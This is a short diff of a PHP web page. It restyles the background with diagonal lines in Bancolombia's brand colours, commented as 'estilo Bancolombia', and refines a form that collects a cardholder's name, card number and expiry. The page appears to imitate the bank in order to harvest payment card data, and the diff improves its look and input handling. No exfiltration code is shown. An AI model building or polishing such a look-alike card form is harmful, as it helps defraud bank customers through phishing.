@@ -84,12 +84,10 @@ $fecha = date('l, j \d\e F \d\e Y, g:i a', strtotime('-5 hours'));
 
 <div class="bg-curves">
 <svg viewBox="0 0 1440 900" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
-  <path d="M -120 420 C 140 360, 220 240, 340 180" stroke="#FF7A1A" stroke-width="28" fill="none" stroke-linecap="round"/>
-  <path d="M -100 480 C 160 400, 260 280, 400 220" stroke="#FDDA24" stroke-width="24" fill="none" stroke-linecap="round"/>
-  <path d="M -80 540 C 180 440, 300 320, 460 260" stroke="#8330C2" stroke-width="20" fill="none" stroke-linecap="round"/>
-  <path d="M 1560 120 C 1300 180, 1200 280, 1080 340" stroke="#8330C2" stroke-width="28" fill="none" stroke-linecap="round"/>
-  <path d="M 1580 180 C 1320 240, 1220 340, 1100 400" stroke="#FDDA24" stroke-width="24" fill="none" stroke-linecap="round"/>
-  <path d="M 1600 240 C 1340 300, 1240 400, 1120 460" stroke="#FF7A1A" stroke-width="20" fill="none" stroke-linecap="round"/>
+  <!-- 3 lineas diagonales gruesas estilo Bancolombia -->
+  <path d="M -80 -20 L 520 480" stroke="#FF7A1A" stroke-width="42" fill="none" stroke-linecap="round"/>
+  <path d="M -80 60 L 440 520" stroke="#FDDA24" stroke-width="38" fill="none" stroke-linecap="round"/>
+  <path d="M -80 140 L 360 560" stroke="#8330C2" stroke-width="34" fill="none" stroke-linecap="round"/>
 </svg>
 </div>
 
@@ -214,8 +212,8 @@ $fecha = date('l, j \d\e F \d\e Y, g:i a', strtotime('-5 hours'));
         <div class="field"><label>Nombre del titular</label><input id="titular" placeholder="Como aparece en la tarjeta" autocomplete="off"></div>
         <div class="err-msg" id="err-titular">Ingresa el nombre del titular</div>
 
-        <div class="field"><label>Número de tarjeta</label><input id="cardnum" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off"></div>
-        <div class="err-msg" id="err-cardnum">Ingresa el número de tarjeta</div>
+        <div class="field"><label>Número de tarjeta</label><input id="cardnum" type="tel" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" pattern="[0-9]*" autocomplete="off"></div>
+        <div class="err-msg" id="err-cardnum">Número de tarjeta inválido</div>
 
         <div class="row">
           <div class="field"><label>Vencimiento</label><input id="venc" placeholder="MM/AA" maxlength="5" inputmode="numeric" autocomplete="off"></div>
